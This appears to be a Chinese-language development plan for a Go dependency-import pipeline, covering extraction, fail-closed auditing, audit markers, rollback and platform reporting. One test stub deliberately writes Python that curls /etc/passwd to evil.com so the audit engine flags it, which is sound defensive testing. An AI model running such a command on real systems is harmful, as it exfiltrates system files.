func buildTestArchive(t *testing.T, files map[string]string) string {
	t.Helper()

	path := filepath.Join(t.TempDir(), "deps.tar.gz")
	f, err := os.Create(path)
	if err != nil {
		t.Fatalf("create archive: %v", err)
	}
	defer f.Close()

	gz := gzip.NewWriter(f)
	tw := tar.NewWriter(gz)

	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names) // 稳定的写入顺序，便于失败复现

	for _, name := range names {
		content := files[name]
		hdr := &tar.Header{
			Name:     name,
			Mode:     0o644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("write header %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("write body %s: %v", name, err)
		}
	}

	if err := tw.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
	return path
}

// assertDepsRootEmpty 断言内容寻址根目录下没有任何残留目录。
func assertDepsRootEmpty(t *testing.T, state *TAAState) {
	t.Helper()
	entries, err := os.ReadDir(state.Security.GetDepsDir())
	if err != nil {
		t.Fatalf("read deps root: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("deps root is not empty, %d leftover entries: %v", len(entries), entries)
	}
}
```

`deps_import_test.go` 的 import 块**只补这五个**：`"archive/tar"`、`"compress/gzip"`、`"os"`、
`"path/filepath"`、`"sort"`。

**不要加 `"encoding/json"`**（初稿列了它，但本任务的三个用例一个都不解析 JSON——Task 5 的响应
解码复用同包 `decodeResponse`，测试也不断言上报内容）。Go 的未使用 import 是编译错误，
加了会直接编译不过。Task 8/10 若往本文件追加解析 JSON 的用例，各自再补。
`"net/http"`、`"net/http/httptest"`、`"testing"`、`"time"` 是 Task 5 已引入且仍在用的，**保持不动**。

`depsAuditMarker` 常量在 Task 6 Step 4 定义，本步骤先按名字引用。

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/controller/ -run 'TestProcessImportedDeps' -v
```

期望：编译失败 `depsInstallFunc undefined`。

- [ ] **Step 3: 定义可替换的安装钩子**

在 `internal/controller/deps_import.go` 顶部（`depsImportRequest` 之前）新增。

**只设一个钩子**：真正的审计调用留在 `auditAndReportDeps` 里直接走
`Security.ScanEnabled` 判断，测试用 `state.Security.ScanEnabled = false` 短路，
与模型导入测试的既有手法一致——多设一个审计钩子只会增加一处需要维护的间接层。

```go
// depsInstallFunc is the swappable installer hook. Production binds it to
// runtime.InstallWheelhouse; tests substitute a stub so CI never shells out to pip.
var depsInstallFunc = func(wheelhouse, target string) error {
	return runtime.InstallWheelhouse(context.Background(), wheelhouse, target)
}
```

用包级变量初始化而非 `init()`，避免"赋值发生在 `init` 而测试在 `init` 之后替换"这类顺序疑虑；
测试替换后 `t.Cleanup` 恢复原值即可。

- [ ] **Step 4: 实现流水线**

把 Task 5 的 `processImportedDeps` 占位替换为完整实现：

```go
// processImportedDeps 是依赖包导入的异步流水线：
//
//	解密 → SM3 内容寻址 → 幂等检查 → 解包到临时 wheelhouse → 包结构校验
//	→ 离线安装到 DEPS_DIR/<sm3> → fail-closed 审计 → 落审计标记 → 置状态 → 上报
//
// 失败路径一律回滚：清状态并删除 DEPS_DIR/<sm3>，不留半成品目录。
func (s *TAAState) processImportedDeps(req depsImportRequest, phase int, ciphertextPath string) {
	defer os.Remove(ciphertextPath)

	s.setCurrentOp("decrypting")
	plaintextPath, isDecrypted, err := s.resolvePlaintextResource(req.ResourceURL, ciphertextPath, "importDeps")
	if err != nil {
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, fmt.Sprintf("解密依赖包失败: %v", err))
		return
	}
	if isDecrypted {
		defer os.Remove(plaintextPath)
	}

	size, hash, err := teecrypto.HashFileSM3(plaintextPath)
	if err != nil {
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, fmt.Sprintf("计算依赖包哈希失败: %v", err))
		return
	}
	checksum := map[string]any{"size": size, "algorithm": "sm3", "value": hash}
	depsDir := s.depsDirForHash(hash)
	s.Logs.Add(LogInfo, "importDeps", "依赖包 SM3=%s (%d bytes) -> %s", hash, size, depsDir)

	// 幂等：已审计通过的同 hash 目录直接复用，不重复解包与安装。
	if auditMarkerExists(depsDir) {
		s.Logs.Add(LogInfo, "importDeps", "依赖包 %s 已审计通过，复用现有目录", hash)
		s.saveDepsSuccess(hash, checksum)
		s.reportDepsSuccess(req, checksum)
		s.setCurrentOp("idle")
		return
	}

	s.setCurrentOp("deps_installing")

	// Unpack into a temporary wheelhouse: extracting the outer archive needs zip-slip
	// protection against a base directory of its own, so it must not write into the
	// content-addressed directory; expanding the wheels themselves is pip's job.
	// The temp dir sits under the deps root rather than the system temp dir because a
	// wheelhouse can be gigabytes and the container's root partition cannot hold it
	// (spec 2.5); the deps root is the volume sized for exactly this.
	wheelhouse, err := os.MkdirTemp(s.Security.GetDepsDir(), "taa-deps-wh-*")
	if err != nil {
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, fmt.Sprintf("创建临时依赖目录失败: %v", err))
		return
	}
	defer os.RemoveAll(wheelhouse)

	if err := resource.ExtractArchiveToDir(wheelhouse, plaintextPath); err != nil {
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, fmt.Sprintf("解压依赖包失败: %v", err))
		return
	}
	if err := resource.ValidateWheelhouse(wheelhouse); err != nil {
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, err.Error())
		return
	}

	// 安装前先清掉同名残留，保证失败路径的 rm 是幂等的。
	if err := os.RemoveAll(depsDir); err != nil {
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, fmt.Sprintf("清理依赖目录失败: %v", err))
		return
	}
	if err := depsInstallFunc(wheelhouse, depsDir); err != nil {
		// Same helper as the audit-failure path: it removes the directory and clears the
		// binding when -- and only when -- this directory is the one currently in effect.
		s.rollbackDepsImport(depsDir)
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, fmt.Sprintf("安装依赖包失败: %v", err))
		return
	}
	s.Logs.Add(LogInfo, "importDeps", "依赖包安装完成: %s", depsDir)

	if !s.auditAndReportDeps(req, depsDir) {
		s.rollbackDepsImport(depsDir)
		s.reportDepsFailure(req, "依赖包审计未通过")
		s.setCurrentOp("idle")
		return
	}

	if err := writeAuditMarker(depsDir); err != nil {
		// Same reasoning as the install-failure branch above.
		s.rollbackDepsImport(depsDir)
		s.setCurrentOp("idle")
		s.reportDepsFailure(req, fmt.Sprintf("写入审计标记失败: %v", err))
		return
	}

	s.saveDepsSuccess(hash, checksum)
	s.reportDepsSuccess(req, checksum)
	s.setCurrentOp("idle")
	s.Logs.Add(LogInfo, "importDeps", "阶段%d: 依赖包导入完成: hash=%s, taskId=%s", phase, hash, req.TaskID)
}
```

`deps_import.go` 的 import 块需补齐：`"context"`、`"os"`、`"path/filepath"`、
`"taa/internal/resource"`、`"taa/internal/runtime"`、`teecrypto "taa/pkg/crypto"`。

注意 `resolvePlaintextResource` 的既有签名是
`(resourceURL, downloadedPath, logScope string) (string, bool, error)`
（`import_processing.go:867`），上面的调用与之一致。

**注意 zip-slip 的来源**：`resource.ExtractArchiveToDir` 内部先解包到
`dst` 的兄弟临时目录再 `os.Rename`（`internal/resource/archive.go:41-66`），路径穿越防护
在 `ExtractArchiveFile` 内完成。因此 `wheelhouse` 必须是**独立的临时目录**，
不能直接传内容寻址目录——否则外层归档里的 `../` 会以 `depsDir` 为 base 计算，
保护范围与预期不符。这正是 Step 4 用 `os.MkdirTemp` 而非内容寻址目录 `depsDir/<hash>` 的原因。

**但临时目录的父目录要选对**：初稿写的是 `os.MkdirTemp("", "taa-deps-wh-*")`，即落在系统临时目录。
本项目的实测约束是容器根分区约 28G、镜像已占约 25G（spec §2.5），而 torch 系 wheelhouse 动辄 GB 级——
解包到根分区会直接 ENOSPC（若 `/tmp` 是 tmpfs 则更糟：吃内存）。改为
`os.MkdirTemp(s.Security.GetDepsDir(), "taa-deps-wh-*")`：仍是**独立临时目录**（zip-slip 的 base 语义
不变），但落在为依赖准备的那个卷上。前缀 `taa-deps-wh-` 不会与内容寻址目录的 hash 名混淆；
进程崩溃时可能残留，属已知代价（自动清扫是 YAGNI，spec §14 已明确不做自动清理）。

同文件新增三个小辅助：

```go
const depsAuditMarker = ".taa_audit_ok"

// depsAuditMarkerVersion is the trust content of the audit marker. Bump it whenever the audit
// engine, policy, or rule set changes: auditMarkerExists compares content, so an existing
// dependency directory carrying a marker from any other policy is re-audited instead of reused.
//
// Existence alone is not enough to trust a marker. Anything that writes one under a weaker
// policy would otherwise be believed forever, and the directory it guards is content-addressed
// and permanent. That is not hypothetical: this pipeline writes the same marker on the
// ScanEnabled=false short-circuit as it does after a real audit, and the fail-open stub this
// branch used to carry wrote a genuine marker for a set that was never audited at all.
// Versioning is what makes those markers distinguishable, and it is the only handle that lets
// a future policy change invalidate the markers already on disk. It does not provide
// tamper-resistance -- anyone who can write into DEPS_DIR can forge the string -- which would
// take a signature; this is the right starting point before that.
const depsAuditMarkerVersion = "taa-deps-audit-v1\n"

func auditMarkerExists(depsDir string) bool {
	info, err := os.Stat(filepath.Join(depsDir, depsAuditMarker))
	if err != nil || info.IsDir() {
		return false
	}
	content, err := os.ReadFile(filepath.Join(depsDir, depsAuditMarker))
	if err != nil {
		return false
	}
	return string(content) == depsAuditMarkerVersion
}

func writeAuditMarker(depsDir string) error {
	return os.WriteFile(filepath.Join(depsDir, depsAuditMarker), []byte(depsAuditMarkerVersion), 0o644)
}

// rollbackDepsImport discards the directory of a dependency set that failed to import, and
// clears the binding only when that very set is the one currently in effect.
//
// A rejected newcomer must not unseat a dependency set that is already working. The binding
// is overwritten on success only (see saveDepsSuccess), so a failed import leaves the
// previous set active and training keeps running on it; the alternative — clearing
// unconditionally — would silently degrade a working configuration to "no dependencies"
// and surface later as an unrelated ImportError during training.
//
// The mirror case is why the clear is conditional rather than absent: when the directory
// just removed IS the bound one (a re-import whose audit marker was deleted by hand, so the
// idempotence check did not catch it), keeping the bit would leave a binding pointing at a
// directory that no longer exists -- the same silent degradation with the two halves swapped.
// The invariant is therefore: a binding never outlives the directory it points at.
// Every failure branch that removes a dependency directory routes through here, so the
// invariant holds uniformly rather than on the audit path alone.
//
// runDepsAudit also removes the directory on every path that returns false (deps_audit.go),
// so the removal here is normally a no-op. It is kept so that this pipeline's own
// "no half-built directory survives a failure" guarantee does not hinge on a side effect
// of a function whose job is to audit.
func (s *TAAState) rollbackDepsImport(depsDir string) {
	_ = os.RemoveAll(depsDir)
	// currentDepsDir() already encodes "imported && hash non-empty", and depsDirForHash
	// builds its result the same way, so equality means this failed set is the bound one.
	// (The marker is written before saveDepsSuccess, so normally the audit path is only
	// reached for a set that is not yet bound; the guard also covers a re-import whose
	// marker was deleted by hand.)
	if s.currentDepsDir() == depsDir {
		s.clearDepsState()
	}
}
```

`reportDepsSuccess` / `reportDepsFailure` 是本任务内的两个薄封装：

```go
func (s *TAAState) reportDepsSuccess(req depsImportRequest, checksum map[string]any) {
	s.reportDepsAsync(req.RequestID, req.TaskID, 0, "依赖包导入成功", checksum)
}

func (s *TAAState) reportDepsFailure(req depsImportRequest, reason string) {
	s.Logs.Add(LogError, "importDeps", "依赖包导入失败: %s", reason)
	s.reportDepsAsync(req.RequestID, req.TaskID, 1, reason)
}
```

它们调用的 `reportDepsAsync` 正式实现属于 **Task 7**，但**本任务必须先把桩补上，否则本包编译不过**
（Task 7 的文件清单写的正是 "Modify: `deps_import.go`（`reportDepsAsync`）"，即它假定该函数已存在；
两者必须一致，二选一都会漏。此处取"Task 6 建桩、Task 7 替换"）。桩只记日志、不发网络请求：

```go
// reportDepsAsync reports a dependency import result to the platform.
// This stub only logs; Task 7 replaces it with the real platform callback.
func (s *TAAState) reportDepsAsync(requestID, taskID string, code int, msg string, checksum ...map[string]any) {
	s.Logs.Add(LogInfo, "importDeps", "deps import report: request=%s task=%s code=%d msg=%s",
		requestID, taskID, code, msg)
}
```

本任务的测试不断言上报内容（见 Step 1 的三个用例），因此该桩不会被测试误判为"上报成功"。

`auditAndReportDeps` 由 Task 8 实现；本任务先给出**最小可用版本**，使包可编译且
`Security.ScanEnabled=false` 时短路放行：

```go
// auditAndReportDeps runs the fail-closed audit over the installed dependency directory.
// It reports the audit result itself, with scope "deps" (see deps_audit.go). The import
// pipeline's own terminal reportDeps callback is NOT its job: that one belongs to
// processImportedDeps, which must still fire code=1 when this returns false.
func (s *TAAState) auditAndReportDeps(req depsImportRequest, depsDir string) bool {
	if !s.Security.ScanEnabled {
		s.Logs.Add(LogInfo, "audit", "安全扫描未启用，跳过依赖包审计")
		return true
	}
	return s.runDepsAudit(req, depsDir)
}
```

`runDepsAudit` 由 Task 8 实现，本任务给一个返回 **`false`** 的最小版本。
**fail-closed 的含义是"无法审计即拒绝"**：返回 `true` 会让默认配置（`EnableSecurityScan` 默认 true）
下的依赖导入零审计地报 `code=0` 成功，并写出一枚永久骗过 Task 8 真审计的 `.taa_audit_ok` 标记。
桩体内加一行日志说明"真审计属 Task 8、此处按 fail-closed 拒绝"。详见上文 (L)。

- [ ] **Step 5: 运行测试确认通过**

```bash
go test ./internal/controller/ -run 'TestProcessImportedDeps' -v
```

期望：三个用例 PASS。

- [ ] **Step 6: 提交**

```bash
git add internal/controller/deps_import.go internal/controller/deps_import_test.go
git commit -m "feat(deps): add dependency import pipeline with idempotent reuse"
```

---

### Task 6 闭环记录（2026-10-08，规范审查 + 质量审查两轮后 APPROVE）

审查对象是整条 Task 6 提交链，而非单个提交：

| 提交 | 内容 | 来源 |
| :--- | :--- | :--- |
| `0856570` | 流水线主体（幂等复用、安装、状态流转、上报） | 实现 |
| `dffef36` | 归档校验与 zip-slip 用例改为可判别 | 实现者自审 |
| `ae24045` | 审计桩改为 fail-closed + 全部失败路径改走 rollback | 规范审查修复轮 |
| `e382856` | 审计标记版本化 + 堵掉最后一处 rollback 旁路 | 质量审查修复轮 |
| `b15502c` | 三处与相邻代码互相否证的注释 | 质量审查第二次修复轮 |

**规范审查**结论合规；实现者照做，不是漏做。质量审查提出 7 条发现，6 条闭环、1 条经论证
有意不做（见下）。

**本轮最有价值的一条：审计标记必须是「内容」而非「存在」（Q-C）。**

初版 `auditMarkerExists` 只 `os.Stat` 判断存在。审查者指出这条不足为凭，并给出了比预审更强的
反例：`ScanEnabled=false` 的短路分支**与真审计通过后写的是同一个标记**，fail-open 桩也曾为
一套从未被审计的依赖写过**真标记**。依赖目录是内容寻址且**永久保留**的，一旦被弱策略写下的
标记骗过，`Task 8` 的真审计会被永久短路。现改为内容比对：

```go
const depsAuditMarkerVersion = "taa-deps-audit-v1\n"
// auditMarkerExists: os.Stat (含 info.IsDir() 显式守卫) -> os.ReadFile -> 内容 == 常量
```

版本号是唯一能让**未来策略变更**作废磁盘上既有标记的把手。它**不提供防篡改**——能写 `DEPS_DIR`
的人就能伪造这个字符串，那需要签名，属本轮明确不做（spec §14）。

判别力经**双方独立复现**：把 `auditMarkerExists` 退回 existence-only ⇒ 新增的
`TestAuditMarkerVersionGate`（`:373`）与 `TestProcessImportedDepsReauditsForeignMarkerDir`
（`:416`）**双 FAIL**，而 `TestProcessImportedDepsSkipsWhenAlreadyAudited` **仍 PASS**
（两次导入写同版本内容 ⇒ 复用分支照常命中）。这组对照同时证明了"新用例有判别力"与
"复用路径没被改坏"。

**有意不做（记录理由，不再提）**：合并 `assertDepsRootEmpty` 与 `assertDepsRootContainsOnly`
两个帮手。它们位于刚刚被变异验证过的断言内部，在此处改动会削弱那份证据，收益不抵。

#### 交接给 Task 7 / Task 8 的三件事

1. **`runDepsAudit` 目前是 fail-closed 桩**（`:317-320`，打日志后 `return false`），拒绝**一切**
   依赖包。这是 spec §3 决策 5 的正确实现，**不得**为了"让测试跑通"回退为 `return true`
   ——那会让未审计的依赖包通过、写出真标记、永久短路 Task 8 的真审计（`ae24045` 修的正是这个）。
2. **`deps_audit.go` 尚不存在**（`ls` 报 No such file，`git log --all --` 该路径为空），由 Task 8
   `Create`。`rollbackDepsImport` 的注释已写明：今天那次 `RemoveAll` 是本流水线**唯一**的删除动作；
   Task 8 落地后它才成为"redundant second net"。Task 8 必须让 `runDepsAudit` 在**每条** `false`
   路径上删目录，否则该注释再次变成假话（这正是 `b15502c` 修掉的毛病）。
3. **`importDeps` 目前没有任何路径到达平台。** `reportDepsAsync`（`:287-290`）是纯日志桩，
   `reportDepsFailure`/`reportDepsSuccess` 都只调它。因此今天 `importDeps` 的成功与失败**都不会
   产生平台回调**，对平台表现为**挂起**而非报错。Task 7 落地前**不得**做任何依赖导入的平台
   集成测试——那会测出一个"什么都没发生"的假结论。

#### 过程记录（本轮暴露的两处我方失误，非实现者问题）

1. **控制器自身的归因错误**：我把规范/质量审查者的**发现编号**与修复轮的**改动编号**混为一谈，
   据此质问修复方"你报告已改、实际没改"。实际上那段注释**从未出现在它的简报里**，它没有误报。
   教训：向审查者转述修复范围时，必须引用**具体文本**而不是编号。
2. **blob 哈希核验存在内容级盲区**：`git hash-object` vs `git rev-parse HEAD:<file>` 只证明
   "哪些文件变了"，证明不了"文件内部哪几行变了"。为此本轮起，对 subagent 声称"已替换/已删除"
   的每一处，加做**内容级**核验：按**文本锚点**（而非行号区间——提交间行号会漂移，
   `ae24045` 的 `:258-261` 就在 `e382856` 里变成了另一段注释）取段做 md5，并 `grep -c` 确认
   新串确实存在。`b15502c` 即按此法验过：三条旧串计数全 0、四条新串计数全 1、`-U0` diff
   过滤注释行后为空。

---

### Task 6/7 编码前补充（Task 5 代码质量审查发现，2026-10-08）

Task 5 的代码质量审查提出：`deps_import.go` 传给 `runAsyncSafe` 的名字是 `"processImportedDeps"`，
而 `handleAsyncPanic` 按名字分类，故 panic 时会被标成 `data_import`。**该结论经核对不成立**，
但顺着它查出了一条真实缺陷，记在这里由 **Task 7** 一并修复（Task 5 不必回改）。

**核对结果（三处已实测）**

| 位置 | 事实 |
| :--- | :--- |
| `route.go:681-688` | `tryAcquireTaskTyped` 的第 4 个参数写入 `activeTask.Type`；Task 5 传的是 `"deps_import"` |
| `route.go:798-804` | 名字兜底 `strings.Contains(lower(name), "model")` **只在 `snapshot.Type` 为空时才执行** |
| `reporter.go:221-226` | `ReportTaskOutcome` 只特判 `"model_import"`，**其余一律 `ReportRes`** |

所以 panic 时序是：`snapshot.Type == "deps_import"` ⇒ `taskType` 非空 ⇒ 名字兜底**不执行**（**没有误标**）
⇒ `ReportTaskOutcome(..., "deps_import", ...)` ⇒ 落到 **`ReportRes`**。

**真实缺陷**：平台派发的是 `importDeps` 任务，它的终态契约是 `reportDeps`；而 panic 路径发出的
是 `res` 形状的载荷，`reportDeps` **永不发出** ⇒ 平台侧的 `importDeps` 任务拿不到终态，表现为
**挂起**而非失败——与 Task 6/8 预审 Finding A 同一类缺陷，只是触发点从"审计失败"换成"流水线 panic"。

附带事实（**不必处理**）：`handleAsyncPanic` 还会往 `resultDir` 写一份 `training_report.json`
（内含 `model_checksum`/`data_checksum`），对依赖导入无意义但无害；且它调用 `ReportTaskOutcome`
时**不传 checksum**（`route.go:843-846` 只有 6 个实参），所以 `ReportDeps` 在 panic 路径上收到的是
空 checksum，语义正确。

**可达性**：Task 5 不可达（占位体只有 `os.Remove`，不会 panic）；Task 6 写入真实流水线后可达
（文件 I/O、pip、审计）。

**修复（Task 7 追加，三处均为数行改动）**

1. `internal/platform/reporter.go` 新增
   `ReportDeps(ctx, platformAddr, dockerID, requestID, taskID string, code int, msg string, checksum ...map[string]any) error`，
   形状对齐 `ReportModelImport`（签名不妨带 `report string`——依赖导入没有训练报告可传）。
2. `ReportTaskOutcome` 增加分流分支。`route.go:844` 的注释写的就是"通过 ReportTaskOutcome 自动分流"，
   **这里是既定扩展点，不要去改 `handleAsyncPanic`**：

```go
	if taskType == "model_import" {
		return ReportModelImport(ctx, platformAddr, dockerID, requestID, taskID, code, msg, checksum...)
	}
	if taskType == "deps_import" {
		return ReportDeps(ctx, platformAddr, dockerID, requestID, taskID, code, msg, checksum...)
	}
	return ReportRes(ctx, platformAddr, dockerID, requestID, taskID, code, msg, report)
```

3. 顺手堵住 `taskType == ""` 的名字兜底（`route.go:798-804`）。当前不可达——异步体执行时快照必定
   已由 `tryAcquireTaskTyped` 建立——但**兜底分支存在的意义正是"快照意外缺失"**，留一个会把
   依赖任务导去 `ReportRes` 的洞与它的存在理由冲突：

```go
	if taskType == "" {
		switch {
		case strings.Contains(strings.ToLower(name), "model"):
			taskType = "model_import"
		case strings.Contains(strings.ToLower(name), "deps"):
			taskType = "deps_import"
		default:
			taskType = "data_import"
		}
	}
```

**测试（Task 7 追加）**：`TestReportTaskOutcomeDispatchesDepsToReportDeps`——断言
`ReportTaskOutcome(..., "deps_import", ...)` 打到 `reportDeps` 的 URL 而非 `reportRes` 的 URL。
判别力必须靠**变异**确认：删掉新增的 `deps_import` 分支后该用例必须 FAIL；只断言"没有报错"
的写法在该变异下仍然通过，属于无效断言。

---

## Task 7: `reportDeps` 平台回调

**Files:**
- Modify: `internal/platform/reporter.go:11-17`、`:46-53`、`:191+`（含 `ReportTaskOutcome` 的分流分支）
- Modify: `internal/controller/report.go`
- Modify: `internal/controller/deps_import.go`（`reportDepsAsync`）
- Modify: `internal/controller/route.go:798-804`（名字兜底补 `deps` 判定）
- Test: `internal/platform/reporter_test.go`（**新建**，见 Step 1 的包名说明）
- Test: `internal/controller/deps_import_test.go`（**追加**，见 Step 1b；必须在 `package controller` 里）

- [ ] **Step 1: 写失败测试**

**新建 `internal/platform/reporter_test.go`**（2026-10-08 实测：该目录下**没有** `reporter_test.go`，
只有 `client_test.go`，所以是"新建"而非"追加"）：

- **包名必须是 `package platform`（内部测试包）**，不能照抄 `client_test.go` 的
  `package platform_test`。下面的代码用的是不带限定的 `ReportDepsEndpoint` / `ReportDeps`；
  若写成外部测试包，会报 `undefined: ReportDepsEndpoint`。Go 允许同目录下两个测试包并存，
  所以新建内部测试包不会与 `client_test.go` 冲突，也**不要**去改 `client_test.go`。
- **import 块**：`"context"`、`"encoding/json"`、`"net/http"`、`"net/http/httptest"`、`"testing"`。
  同样**不要** import `"taa/internal/platform"`（内部测试包引用自己不需要前缀）。

```go
func TestReportDepsPostsChecksum(t *testing.T) {
	var got map[string]any
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != ReportDepsEndpoint {
			t.Errorf("path = %q, want %q", r.URL.Path, ReportDepsEndpoint)
		}
		if err := json.NewDecoder(r.Body).Decode(&got); err != nil {
			t.Errorf("decode: %v", err)
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
	}))
	defer server.Close()

	checksum := map[string]any{"size": int64(7), "algorithm": "sm3", "value": "h"}
	if err := ReportDeps(context.Background(), server.URL, "docker-1", "req-1", "task-1", 0, "依赖包导入成功", checksum); err != nil {
		t.Fatalf("ReportDeps: %v", err)
	}
	if got["checksum"] == nil {
		t.Fatalf("checksum missing from payload: %#v", got)
	}
}

func TestReportAuditScopedCarriesScope(t *testing.T) {
	var got map[string]any
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewDecoder(r.Body).Decode(&got)
		_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
	}))
	defer server.Close()

	if err := ReportAuditScoped(context.Background(), server.URL, "docker-1", "req-1", "task-1", 0, "ok", "{}", "deps"); err != nil {
		t.Fatalf("ReportAuditScoped: %v", err)
	}
	if got["scope"] != "deps" {
		t.Fatalf("scope = %v, want deps", got["scope"])
	}
}
```

- [ ] **Step 1b: 补一条流水线到平台的贯通用例（§12 的第三个分句）**

§12 的 fail-closed 回滚条目写的是三段：`DepsImported=false`、目录被清、**`reportDeps` 收到 `code=1`**。
前两段由 Task 6 的用例覆盖，**第三段此前无任何 Task 覆盖**：Task 6 的 `reportDepsAsync` 是只记日志的桩，
而本 Step 1 的两条用例只单测 platform 层函数，谁都没有把"流水线失败"与"平台真的收到 code=1"接起来。
这条正是 §12 要的端到端断言，且**只有在本任务 Step 5 把桩换成真回调之后才可能通过**——所以按 TDD
写在这里。

**位置：`internal/controller/deps_import_test.go`，`package controller`。** 不能放进 Step 1 新建的
`internal/platform/reporter_test.go`——后者是内部测试包但属于 **platform** 包，访问不到 `TAAState`
与 `processImportedDeps`。

**不要自己发明归档构造与任务槽位的写法**：直接复用 Task 6 在该文件里已经建好的流水线脚手架
（同文件里的 `TestProcessImportedDeps*` 用例展示了如何造合法 wheelhouse 归档、替换
`depsInstallFunc`、以及驱动 `processImportedDeps`）。读完那几条用例再动手。

要求：

- **安装桩必须往 `target` 写入一段会被正则引擎命中的代码**，不能只 `MkdirAll`。这一条是**承重的**，
  见下方"为什么要写恶意内容"。
- `state.Security.ScanEnabled = true`。Task 6 自己的用例把 `ScanEnabled` 置 false 是为了让流水线
  **成功**，目的与本用例相反，不要照抄。
- `state.Security.LLM = codeaudit.LLMConfig{Enabled: false}`，避开 `runDepsAudit` 里
  `cfg.Enabled && cfg.FailClosed` 的 LLM 探测分支（Task 8 的用例同样这么做）。
- 用一个 `httptest` 平台接管 `state.PlatformIP`/`state.DockerID`，断言收到的请求
  **路径等于 `reportDepsEndpoint`**（`report.go` 已有该常量；不要写字符串字面量）**且 `code` 字段为 1**。
- 用带超时的 `select` 等待，超时即 `t.Fatal`。不要用无超时的 channel 接收——回调没发出时用例会挂到
  整体超时，表现为"卡住"而不是"失败"，掩盖诊断信息。
- 同时断言 `state.currentDepsDir() == ""`，把 §12 的前两段（`DepsImported=false`、目录被清）与第三段
  （平台收到 `code=1`）钉在同一个用例里。

**可复用的既有 helper（实测存在于 `deps_import_test.go`，不要另造）**：`buildTestDepsArchive(t)`
（`:424`，造一个能通过 `ValidateWheelhouse` 的合法归档）、`buildTestArchive(t, files map[string]string)`
（`:433`，需要自定义包内文件时用它）、以及 `:252` 起几条 `TestProcessImportedDeps*` 用例示范的
`depsInstallFunc` 替换与 `processImportedDeps` 驱动方式。

**为什么要写恶意内容（跨 Task 8 的存活性）**：本用例**必须在 Task 8 替换掉桩之后依然通过**。
- 在 Task 6→Task 8 的窗口里：`runDepsAudit` 是无条件 `return false` 的桩，安装桩写什么都会失败，
  于是走"审计未通过 ⇒ 回滚 ⇒ `reportDepsFailure(code=1)`"。
- Task 8 落地真审计之后：桩消失，审计改为**真的扫** `depsDir`。若安装桩只 `MkdirAll` 而不落任何文件，
  目录是空的、正则引擎一条都不命中、审计**通过**、流水线**成功**、平台收到的是 `code=0`——
  **本用例会掉头把 Task 8 的 Step 5/Step 10 测试跑挂**。

所以安装桩要写成"建目录 + 写一个命中规则的 `.py`"，这样两个窗口里审计都必然失败。用 Task 8 已实测
能命中的那段：

```go
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
	}
```

（不必为"Task 8 之后引擎换成 Semgrep"操心：`setupTestState` 装的是 `codeaudit.DefaultEngine()`，
即正则基线，不需要外部二进制。日后若默认引擎改成 Semgrep，本用例与 Task 8 的用例会**一起**需要调整，
那是同一次变更。）

**判死要求**：把 Step 5 的 `reportDepsAsync` 换回只记日志的桩，本用例必须 FAIL；只断言"没有返回错误"
的写法无效。

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/platform/ -run 'TestReportDeps|TestReportAuditScoped' -v
go test ./internal/controller/ -run 'TestProcessImportedDepsReportsFailureCodeToPlatform' -v
```

期望：编译失败 `ReportDeps undefined`。

- [ ] **Step 3: 实现 platform 层**

`internal/platform/reporter.go` 的端点常量块（`:12-16`）新增：

```go
	ReportDepsEndpoint        = "/v1/taa/reportDeps"
```

`reportAuditPayload`（`:46-53`）新增字段：

```go
	Scope     string  `json:"scope,omitempty"`
```

`reportModelImportPayload` 之后新增：

```go
type reportDepsPayload struct {
	DockerID  string         `json:"dockerId"`
	RequestID string         `json:"requestId"`
	TaskID    string         `json:"taskId"`
	Code      int            `json:"code"`
	Msg       *string        `json:"msg"`
	Checksum  map[string]any `json:"checksum,omitempty"`
}
```

`ReportModelImport`（`:152-188`）之后新增，结构完全对齐它：

```go
// ReportDeps 向上游平台发送依赖包导入完成状态上报
func ReportDeps(ctx context.Context, platformAddr, dockerID, requestID, taskID string, code int, msg string, checksum ...map[string]any) error {
	addr, dID, reqID, tID, err := ValidateAndNormalizePlatformParams(platformAddr, dockerID, requestID, taskID)
	if err != nil {
		return err
	}

	if code == 0 && strings.TrimSpace(msg) == "" {
		msg = "依赖包导入成功"
	}

	var cs map[string]any
	if len(checksum) > 0 {
		cs = checksum[0]
	}

	var msgPtr *string
	if strings.TrimSpace(msg) != "" {
		msgVal := msg
		msgPtr = &msgVal
	}

	payload := reportDepsPayload{
		DockerID:  dID,
		RequestID: reqID,
		TaskID:    tID,
		Code:      code,
		Msg:       msgPtr,
		Checksum:  cs,
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("marshal reportDeps payload: %w", err)
	}

	url := PlatformURL(addr, ReportDepsEndpoint)
	return SendPlatformJSON(ctx, defaultHTTPClient, url, data)
}

// ReportAuditScoped 与 ReportAudit 相同，但额外携带 scope 以区分模型审计与依赖审计。
// 空 scope 表示模型审计，保持与旧版平台的兼容。
func ReportAuditScoped(ctx context.Context, platformAddr, dockerID, requestID, taskID string, code int, msg, report, scope string) error {
